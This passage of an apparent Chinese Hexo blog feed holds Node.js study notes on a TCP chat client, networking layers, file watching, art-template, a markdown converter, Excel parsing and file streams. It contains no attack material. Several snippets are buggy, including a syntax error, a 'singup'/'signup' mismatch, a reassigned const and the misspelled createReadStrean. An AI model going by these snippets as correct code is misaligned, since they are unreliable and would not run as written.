class="line">&#125;;</span><br><span class="line"><span class="comment">// 这个变量用来保存用户的昵称同时也作为一个标记</span></span><br><span class="line"><span class="keyword">let</span> nickname;</span><br><span class="line">socket.on(<span class="string">'connect'</span>, () =&gt; &#123;</span><br><span class="line">  process.stdout.write(<span class="string">'请输入你的昵称：'</span>);</span><br><span class="line">  process.stdin.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">    data = data.toString().trim();</span><br><span class="line">    <span class="keyword">if</span> (!nickname) &#123;</span><br><span class="line">      <span class="keyword">const</span> send = &#123;</span><br><span class="line">          type: <span class="string">'signup'</span>,</span><br><span class="line">          message: data,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将 json 对象转为字符串就叫做序列化</span></span><br><span class="line">        <span class="comment">// 将 json 格式字符串转为对象叫做反序列化</span></span><br><span class="line">      <span class="keyword">return</span> socket.write(<span class="built_in">JSON</span>.stringify(send));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把所有这种指令型的都加上一个 \ 用来区分</span></span><br><span class="line">    <span class="comment">// \help</span></span><br><span class="line">    <span class="keyword">if</span> (data === <span class="string">'\\list'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> socket.json(&#123;</span><br><span class="line">        type: <span class="string">'list'</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果用户输入的 xxx:dsadsadsa</span></span><br><span class="line">    <span class="comment">// 就包装成点对点聊天数据格式</span></span><br><span class="line">    <span class="keyword">const</span> matches = <span class="regexp">/^(.+):(.+)$/</span>.exec(data)</span><br><span class="line">    <span class="keyword">if</span> (matches) &#123;</span><br><span class="line">      <span class="keyword">return</span> socket.json(&#123;</span><br><span class="line">        type: <span class="string">'p2p'</span>,</span><br><span class="line">        <span class="keyword">from</span>: nickname,</span><br><span class="line">        to: matches[<span class="number">1</span>],</span><br><span class="line">        message: matches[<span class="number">2</span>]</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    socket.json(&#123;</span><br><span class="line">      type: <span class="string">'broadcast'</span>,</span><br><span class="line">      <span class="keyword">from</span>: nickname,</span><br><span class="line">      message: data</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">socket.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">  <span class="comment">// 客户端也要根据服务器响应的消息做一个处理</span></span><br><span class="line">  <span class="comment">// 例如，当服务器发送了一个被占用的消息的时候，客户端就提示用户请重新输入</span></span><br><span class="line">  <span class="comment">// 当服务器发送一个登陆成功的时候，客户端也提示用户</span></span><br><span class="line">  data = data.toString().trim();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    data = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">    <span class="keyword">switch</span> (data.type) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'singup'</span>:</span><br><span class="line">        <span class="keyword">switch</span> (data.code) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'恭喜，登陆聊天室成功'</span>);</span><br><span class="line">            nickname = data.nickname;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1001</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'昵称已被占用，大侠请重新来过'</span>);</span><br><span class="line">            process.stdout.write(<span class="string">'请输入你的昵称：'</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'broadcast'</span>:</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;data.<span class="keyword">from</span>&#125;</span>说：<span class="subst">$&#123;data.message&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'list'</span>:</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">''</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'================ 用户列表 ================'</span>);</span><br><span class="line">        data.message.forEach(<span class="function"><span class="params">n</span> =&gt;</span> <span class="built_in">console</span>.log(n));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'=========================================='</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'p2p'</span>:</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;data.<span class="keyword">from</span>&#125;</span>对你说：<span class="subst">$&#123;data.message&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;网络编程&quot;&gt;&lt;a href=&quot;#网络编程&quot; class=&quot;headerlink&quot; title=&quot;网络编程&quot;&gt;&lt;/a&gt;网络编程&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;应用层&lt;ul&gt;
&lt;li&gt;http 协议&lt;/li&gt;
&lt;li&gt;在浏览器输入一个地址，浏览器按照 http 协议将输入的地址包装成 http 报文&lt;/li&gt;
&lt;li&gt;和数据传输没有任何关系&lt;/li&gt;
&lt;li&gt;只负责数据包装&lt;/li&gt;
&lt;li&gt;包装目的就是为了区分不同的行为&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;传输层&lt;ul&gt;
&lt;li&gt;将应用层包装好的数据，通过传输层进行传输&lt;/li&gt;
&lt;li&gt;TCP: 电话机&lt;ul&gt;
&lt;li&gt;端到端通信协议，必须知道对方的 ip 地址和端口号&lt;/li&gt;
&lt;li&gt;TCP/IP 对数据传输有一定的完整性的保障&lt;ul&gt;
&lt;li&gt;一旦传输过程发生数据的完整性丢失，则全部丢掉重传&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;三次握手连接&lt;ul&gt;
&lt;li&gt;双方通信必须先建立连接&lt;/li&gt;
&lt;li&gt;确保双方都能收到对方的消息&lt;/li&gt;
&lt;li&gt;首先呢，有两个概念&lt;ul&gt;
&lt;li&gt;客户端 发送一个请求 –&amp;gt; 再回一个 这就是三次握手连接&lt;/li&gt;
&lt;li&gt;服务器 回送一个消息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建立三次握手连接之后双方就可以进行有保证的数据通信了&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用于 web 服务器 和 客户端浏览器 传输数据&lt;/li&gt;
&lt;li&gt;数据安全性，对数据完整性有要求的使用 TCP/IP 协议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UDP: 收音机 广播&lt;ul&gt;
&lt;li&gt;发送一条数据，谁收到我不关心&lt;/li&gt;
&lt;li&gt;例如游戏、在线听歌、看电影 都是使用 UDP 协议&lt;/li&gt;
&lt;li&gt;对于数据的完整性没有保证&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网络层&lt;ul&gt;
&lt;li&gt;路由定位&lt;/li&gt;
&lt;li&gt;IP 寻址 和 路由定位&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;链路层&lt;ul&gt;
&lt;li&gt;“链接层”的功能，它在 “实体层” 的上方，确定了 0 和 1 的分组方式&lt;/li&gt;
&lt;li&gt;对要传输的数据，把 0 和 1 进行分组，分成多个数据块进行传输&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实体层&lt;ul&gt;
&lt;li&gt;光缆、电缆、双绞线、无线电液&lt;/li&gt;
&lt;li&gt;高电频、低电频&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Node-文件操作（下）- 文件监视、markdown转换器</title>
    <link href="http://yoursite.com/2016/12/26/Node-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%8B%EF%BC%89-%20%E6%96%87%E4%BB%B6%E7%9B%91%E8%A7%86%E3%80%81markdown%E8%BD%AC%E6%8D%A2%E5%99%A8/"/>
    <id>http://yoursite.com/2016/12/26/Node-文件操作（下）- 文件监视、markdown转换器/</id>
    <published>2016-12-25T16:00:00.000Z</published>
    <updated>2018-06-06T05:11:15.651Z</updated>
    
    <content type="html"><![CDATA[<h2 id="监视"><a href="#监视" class="headerlink" title="监视"></a>监视</h2><p>文件监视 API fs.watchFile()</p><ul><li>回调函数中需要接收两个参数</li><li>第一个是当前文件的最新状态 stat，</li><li>第二个是变化之前的 stat</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 监视文件的修改时间</span></span><br><span class="line">fs.watchFile(<span class="string">'./node.md'</span>, (curr, prev) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(curr.mtime.getHours() + <span class="string">':'</span> + curr.mtime.getMinutes() + <span class="string">':'</span> +curr.mtime.getSeconds());</span><br><span class="line">  <span class="built_in">console</span>.log(prev.mtime.getHours() + <span class="string">':'</span> + prev.mtime.getMinutes() + <span class="string">':'</span> +prev.mtime.getSeconds());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用模板引擎时需要注意的地方</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="comment">// 1. 调用 template.compile 方法，传入一个模板字符串，得到一个渲染函数</span></span><br><span class="line"><span class="comment">// # 表示不编码输出</span></span><br><span class="line"><span class="keyword">const</span> render = template.compile(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;h1&gt;&#123;&#123;# title &#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line"><span class="comment">// 防止用户恶意注入 JavaScript 代码</span></span><br><span class="line"><span class="keyword">const</span> result = render(&#123;</span><br><span class="line">  title: <span class="string">'&lt;span&gt;hello&lt;/span&gt;'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure><p>在 node 中使用模板引擎</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="comment">// 这是 art-template 的简洁语法</span></span><br><span class="line"><span class="keyword">const</span> render = template.compile(<span class="string">`</span></span><br><span class="line"><span class="string">  &lt;h1&gt;&#123;&#123;title&#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;each list as value i&#125;&#125;</span></span><br><span class="line"><span class="string">      &lt;li&gt;索引&#123;&#123;i&#125;&#125;:&#123;&#123;value&#125;&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;/each&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line"><span class="keyword">const</span> result = render(&#123;</span><br><span class="line">  title: <span class="string">'node 中使用模板引擎'</span>,</span><br><span class="line">  list: [</span><br><span class="line">    <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure><p>以上这段代码的模板是手写到代码中的，我们可以通过文件读取的方式获得模板</p><p>正真想用原生语法，就需要加载另一个native 文件，修改的入口文件： art-tempalte 文件下的package.json, main:”./node/template-native.js”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="comment">// 这是 art-template 的原生语法</span></span><br><span class="line"><span class="keyword">const</span> render = template.compile(<span class="string">`</span></span><br><span class="line"><span class="string">  &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line"><span class="keyword">const</span> result = render(&#123;</span><br><span class="line">  title: <span class="string">'node 中使用模板引擎'</span>,</span><br><span class="line">  list: [</span><br><span class="line">    <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure><p>模板字符串</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">""</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"markdown-body"</span>&gt;</span></span><br><span class="line">    &#123;&#123;# body &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="markdown-文件自动生成-HTML"><a href="#markdown-文件自动生成-HTML" class="headerlink" title="markdown 文件自动生成 HTML"></a>markdown 文件自动生成 HTML</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">'marked'</span>);</span><br><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="comment">// &#123; persistent: true, interval: 1000 &#125; 修改间隔时间</span></span><br><span class="line">fs.watchFile(<span class="string">'./node.md'</span>, &#123; <span class="attr">persistent</span>: <span class="literal">true</span>, <span class="attr">interval</span>: <span class="number">1000</span> &#125;, (curr, prev) =&gt; &#123;</span><br><span class="line">  fs.readFile(<span class="string">'./node.md'</span>, (err, md) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拿到文件数据，将 Markdown 格式字符串转换为 HTML 格式字符串</span></span><br><span class="line">    <span class="keyword">const</span> htmlStr = marked(md.toString());</span><br><span class="line">    fs.readFile(<span class="string">'./template.html'</span>, <span class="string">'utf8'</span>, (err, tmp) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 使用 art-template 模板引擎编译解析</span></span><br><span class="line">      <span class="keyword">const</span> result = template.compile(tmp)(&#123;</span><br><span class="line">        textTitle: <span class="string">'node 学习'</span>,</span><br><span class="line">        title: <span class="string">'node 学习'</span>,</span><br><span class="line">        body: htmlStr,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// 写入要生成的文件中</span></span><br><span class="line">      fs.writeFile(<span class="string">'./node.html'</span>, result, err =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'translate success'</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后， art-template 模板既可以在浏览器中使用还可以在 node 中使用，注意：</p><ul><li>node 中使用时，看 node-modules 文件下 art-template 文件下的 package.json 文件，该文件中的 main 属性就是 node 使用 art-template 模板所使用包的路径。</li><li>在浏览器中使用时，引入的 art-template 包是 dist 目录下的 art-template.js 文件。</li></ul><h2 id="读-execl-文件"><a href="#读-execl-文件" class="headerlink" title="读 execl 文件"></a>读 execl 文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parseXlsx = <span class="built_in">require</span>(<span class="string">'excel'</span>);</span><br><span class="line"><span class="keyword">const</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line">parseXlsx(<span class="string">'./data/课表.xlsx'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 解析 excel 表格日期</span></span><br><span class="line">  <span class="comment">// var date = new Date((42628 - (25567 + 1)) * 86400 * 1000)</span></span><br><span class="line">  <span class="comment">// // 在原有日期 - 1 天</span></span><br><span class="line">  <span class="comment">// date = moment(date).add(-1, 'days').format('YYYY-MM-DD'))</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> day <span class="keyword">of</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (day[<span class="number">1</span>].trim().length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (day[<span class="number">1</span>].includes(<span class="string">'周淑刚'</span>)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(moment(<span class="keyword">new</span> <span class="built_in">Date</span>((<span class="built_in">parseInt</span>(day[<span class="number">0</span>]) - (<span class="number">25567</span> + <span class="number">1</span>)) * <span class="number">86400</span> * <span class="number">1000</span>)).add(<span class="number">-1</span>, <span class="string">'days'</span>).format(<span class="string">'YYYY-MM-DD'</span>), day[<span class="number">1</span>])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h3><p>读取大文件，使用流的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs= <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> src = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">const</span> des = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// 创建一个可读流</span></span><br><span class="line"><span class="comment">// 2. 创建一个可写流</span></span><br><span class="line"><span class="comment">// 3. 更新可毒瘤对象的 data 事件</span></span><br><span class="line"><span class="comment">//    只要流对象已经过创建成功，先一瓢一瓢的读取数据</span></span><br><span class="line"><span class="comment">//    当读取到一定数据的时候，触发 data 事件， 同时将数据传递给回调函数</span></span><br><span class="line"><span class="comment">//    只要度去掉一个点数据，就调用可写流对象的 write 方法，将数据写入到可写流中</span></span><br><span class="line"><span class="comment">// 4. 监听可读流对象的 end 事件</span></span><br><span class="line"><span class="comment">//    当以流的形式读取数据之后，会触发可读流对象的 end 事件</span></span><br><span class="line"><span class="comment">//    使用可写流的 end 方法将可写流关闭</span></span><br><span class="line"><span class="keyword">const</span> readStream = fs.createReadStream(src);</span><br><span class="line"><span class="keyword">const</span> writeStream = fs.createWriteStream(des);</span><br><span class="line"><span class="comment">// 获取要读取文件的总字节大小</span></span><br><span class="line"><span class="keyword">const</span> totalSize = fs.statSync(src).size;</span><br><span class="line"><span class="comment">// 用来统计最新读取到的数据字节数</span></span><br><span class="line"><span class="keyword">const</span> currentSize = <span class="number">0</span>;</span><br><span class="line">readStream.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;((currentSize += data.length) <span class="regexp">/ totalSize * 100).toFixed(2)&#125;%10`);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">  writeStream.write(data);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">&#125;);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">readStream.on('end', () =&gt; &#123;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">  console.log('复制文结束');</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">  writeStream.end();</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">&#125;);</span></span></span></span><br></pre></td></tr></table></figure><p>使用管道方法读写大文件；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> readStream = fs.createReadStrean(src);</span><br><span class="line"><span class="keyword">const</span> writeStream = fs.createWriteStream(des);</span><br><span class="line"><span class="keyword">const</span> fs= <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> src = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">const</span> des = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// 获取要读取文件的总字节大小</span></span><br><span class="line"><span class="keyword">const</span> totalSize = fs.statSync(src).size;</span><br><span class="line"><span class="comment">// 用来统计最新读取到的数据字节数</span></span><br><span class="line"><span class="keyword">const</span> currentSize = <span class="number">0</span>;</span><br><span class="line">readStream.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;((currentSize += data.length) <span class="regexp">/ totalSize * 100).toFixed(2)&#125;%10`);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">  writeStream.write(data);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">&#125;);</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">/</span><span class="regexp">/ 将可读流通过 pipe 方法，数据自动流入指定的可写流中</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">readStream.pipe(writeStream);</span></span></span></span><br></pre></td></tr></table></figure><h2 id="涉及的包"><a href="#涉及的包" class="headerlink" title="涉及的包"></a>涉及的包</h2><ul><li>moment：时间处理</li><li>fs-extra：扩展了原生 fs 模块的功能，例如删除一个非空目录，递归遍历无极目录等</li><li>marked：Markdown转换</li><li>art-template：模板引擎</li><li>excel：读取excel表格文件数据</li><li>nodemon: 监听文件变化，自动重启<ul><li><code>npm install -g nodemon</code></li><li><code>nodemon server.js</code></li><li>该工具会监听文件的变化，使用 node 重新执行对应的脚本文件</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;监视&quot;&gt;&lt;a href=&quot;#监视&quot; class=&quot;headerlink&quot; title=&quot;监视&quot;&gt;&lt;/a&gt;监视&lt;/h2&gt;&lt;p&gt;文件监视 API fs.watchFile()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;回调函数中需要接收两个参数&lt;/li&gt;
&lt;li&gt;第一个是当前文件的最新状态 stat，&lt;/li&gt;
&lt;li&gt;第二个是变化之前的 stat&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; fs = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;fs&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 监视文件的修改时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fs.watchFile(&lt;span class=&quot;string&quot;&gt;&#39;./node.md&#39;&lt;/span&gt;, (curr, prev) =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span 